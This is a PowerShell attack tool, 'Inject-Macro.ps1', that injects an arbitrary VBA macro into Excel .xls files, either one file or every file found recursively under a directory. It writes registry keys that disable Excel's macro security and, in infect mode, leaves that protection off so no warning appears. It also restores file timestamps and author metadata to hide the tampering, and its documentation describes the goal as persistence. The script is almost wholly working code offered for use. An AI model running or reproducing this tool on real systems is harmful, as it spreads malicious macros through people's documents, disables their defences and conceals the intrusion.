<#
.SYNOPSIS
Inject VBA macro code into Excel documents.

Author: Brandan [coldfusion]
License: MIT
Required Dependencies: None
Optional Dependencies: None
 
.DESCRIPTION
Injects the supplied VBA macro code into the specified Excel document.

If the '-Infect' flag is given, the supplied VBA macro code will be injected into all '.xls' 
Excel documents in the specified '-Excel' directory path. Ideally this would be used to establish 
a low level form of persistence. The Excel 'Security' registry keys are not re-enabled on exit, 
which disables Excel's 'Are you sure you want to run this Macro' warning. Additionally, all 
injected Excel documents' full paths are written to 'excel_inject.bak'.

If the '-Clean' flag is given, the injected VBA macro code will be removed from the targeted 
Excel documents. The 'excel_inject.bak' file, created while running Inject-Macro with'-Infect', 
must be in the same directory as Inject-Macro.ps1.

The VBA macro code will only be injected into '.xls' Excel documents, not '.xlsx' or '.xlsm'.

.PARAMETER Excel
Path of the target Excel document or directory path.

.PARAMETER Macro
Path of the VBA macro file you want injected into the Excel document.

.PARAMETER Infect
Inject VBA macro code into all '.xls' Excel documents found in the supplied '-Excel' directory.

.PARAMETER Clean
Removes the inject VBA macro code from all Excel documents that were injected with the '-Infect' flag. 

.EXAMPLE
C:\PS> .\Inject-Macro.ps1 -Excel .\Excel.xls -Macro .\Macro.vba

Description
-----------
Injects the VBA macro 'Macro.vba' into the Excel document 'Excel.xls'

.EXAMPLE
C:\PS> .\Inject-Macro.ps1 -Excel C:\Users\ -Macro C:\temp\Macro.vba -Infect

Description
-----------
Injects the VBA macro 'Macro.vba' into all '.xls' Excel documents found in 'C:\Users\' recursively.

.EXAMPLE
C:\PS> .\Inject-Macro.ps1 -Clean

Description
-----------
Removes the injected VBA macro from all '.xls' Excel documents found in 'excel_inject.bak'.
#>

[CmdletBinding()]
param(
	[Parameter(Mandatory = $False)]
	[String]
	$Excel,

	[Parameter(Mandatory = $False)]
	[String]
	$Macro,

	[Parameter(Mandatory = $False)]
	[Switch]
	$Infect = $False,

	[Parameter(Mandatory = $False)]
	[Switch]
	$Clean = $False
)

function Inject-Macro {
	Clear

	# Create Excel objects
	Add-Type -AssemblyName Microsoft.Office.Interop.Excel
	$XLS = New-Object -ComObject Excel.Application
	$ExcelVersion = $XLS.Version

	# Disable macro security, YES this is needed to inject the macro, (it gets re-enabled below)
	New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 1 -Force | Out-Null
	New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 1 -Force | Out-Null

	$XLS.DisplayAlerts = 'wdAlertsNone'
	$XLS.DisplayAlerts = $False
	$XLS.Visible = $False
	$XLS.ScreenUpdating = $False
	$XLS.UserControl = $False
	$XLS.Interactive = $False

	# Inject macro into multiple Excel documents
	if ($Infect -eq $True) {
		# Process Excel and macro file location
		$Excel = (Resolve-Path $Excel).Path 
		$Macro = (Resolve-Path $Macro).Path

		if ((Test-Path $Excel -pathType container) -eq $True) {
			Write-Host 'Infecting...'
			$ExcelFiles = Get-ChildItem -Path $Excel -include *.xls -recurse

			ForEach ($ExcelFile in $ExcelFiles) {
				try {
					# Get original document metadata
					$LAT = $($(Get-Item $ExcelFile).LastAccessTime).ToString('M/d/yyyy h:m tt')
					$LWT = $($(Get-Item $ExcelFile).LastWriteTime).ToString('M/d/yyyy h:m tt')

					$Output = $ExcelFile

					# Try to open Excel document with bad password (for password protected documents)
					$Workbook = $XLS.Workbooks.Open($ExcelFile, $Null, $Null, 1, "")
					$Author = $Workbook.Author
					$VBA = $Workbook.VBProject.VBComponents.Add(1)
					$VBA.CodeModule.AddFromFile($Macro) | Out-Null

					# Save the document
					$Workbook.Author = $Author
					$Workbook.SaveAs("$Output", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
					$XLS.Workbooks.Close()

					# Re-write original document metadata
					$(Get-Item $ExcelFile).LastAccessTime = $LAT
					$(Get-Item $ExcelFile).LastWriteTime = $LWT

					# Write to file for clean up
					$ExcelFile | Add-Content 'excel_inject.bak' 

					Write-Host "Macro sucessfully injected into $ExcelFile"
				} catch {
					continue
				}
			}
		} else {
			Write-Host 'Please provide a valid directory path!' -foregroundcolor red
			exit
		}

	# Clean up for -Inject
	} elseif ($Clean -eq $True) {
		Get-Content 'excel_inject.bak' | Foreach-Object {
			$ExcelFile = $_

			# Get original document metadata
			$LAT = $($(Get-Item $ExcelFile).LastAccessTime).ToString('M/d/yyyy h:m tt')
			$LWT = $($(Get-Item $ExcelFile).LastWriteTime).ToString('M/d/yyyy h:m tt')

			$Workbook = $XLS.Workbooks.Open($ExcelFile)
			$Author = $Workbook.Author

			# Remove VBA macros
			ForEach ($Module in $Workbook.VBProject.VBComponents) {
				if ($Module.Name -Like "Module*") {
					$Workbook.VBProject.VBComponents.Remove($Module)
				}
			}

			# Save the document
			$Workbook.Author = $Author
			$Workbook.SaveAs("$ExcelFile", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
			$XLS.Workbooks.Close()

			# Re-write original document metadata
			$(Get-Item $ExcelFile).LastAccessTime = $LAT
			$(Get-Item $ExcelFile).LastWriteTime = $LWT

			Write-Host "Macro removed from $ExcelFile"

		}
			# Enable macro security
			New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
			New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

	# Inject macro into single Excel document
	} else {
		# Process Excel and macro file location
		$Excel = (Resolve-Path $Excel).Path 
		$Macro = (Resolve-Path $Macro).Path

		if ((Test-Path $Excel -pathType container) -eq $False) {
			$Output = $Excel
			$Workbook = $XLS.Workbooks.Open($Excel)
			$VBA = $Workbook.VBProject.VBComponents.Add(1)
			$VBA.CodeModule.AddFromFile($Macro) | Out-Null

			# Sanatize document metadata
			$RemoveMetadata = 'Microsoft.Office.Interop.Excel.XlRemoveDocInfoType' -as [type]
			$Workbook.RemoveDocumentInformation($RemoveMetadata::xlRDIAll) 

			# Save the document
			$Workbook.SaveAs("$Output", [Microsoft.Office.Interop.Excel.XlFileFormat]::xlExcel8)
			$XLS.Workbooks.Close()

			# Enable macro security
			New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name AccessVBOM -PropertyType DWORD -Value 0 -Force | Out-Null
			New-ItemProperty -Path "HKCU:\Software\Microsoft\Office\$ExcelVersion\Excel\Security" -Name VBAWarnings -PropertyType DWORD -Value 0 -Force | Out-Null

			Write-Host "Macro sucessfully injected into $Output"
		} else {
			Write-Host 'Please provide a valid Excel file!' -foregroundcolor red
			exit
		}
	}

	# Clean up before exiting
	$XLS.Quit()
	[System.Runtime.Interopservices.Marshal]::ReleaseComObject($XLS) | out-null
	$XLS = $Null

	if (ps excel) {
		kill -name excel
	}

	if ($Infect -eq $True) {
		Write-Host 'All Excel documents have been injected' -foregroundcolor green	
	} elseif ($Clean -eq $True) {
		Write-Host 'Injected macros have been removed from all Excel documents' -foregroundcolor green
	} else {
		Write-Host 'Remember, the injected VBA macro is NOT password protected!' -foregroundcolor red
	}
}

Inject-Macro -Excel $Excel -Macro $Macro
